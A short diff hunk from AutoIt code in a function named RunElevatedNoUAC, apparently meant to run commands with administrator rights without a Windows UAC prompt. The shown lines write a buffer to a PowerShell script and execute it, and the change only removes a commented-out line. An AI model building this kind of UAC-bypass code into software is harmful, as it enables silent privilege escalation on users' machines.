@@ -78,7 +78,6 @@ Func RunElevatedNoUAC($command = "regedit");DESCRIPTION:Run command with elevate
    $hFilehandle = FileOpen($sFileName, $FO_OVERWRITE)
    FileWrite($hFilehandle, $buffer)
    FileClose($hFilehandle)
-   ;FileWrite("buffer.ps1", $buffer & @CRLF)
    $buffer01 = "powershell.exe -noexit ./";
    $buffer00 = $buffer01 & "buffer.ps1"
    RunWait($buffer00);
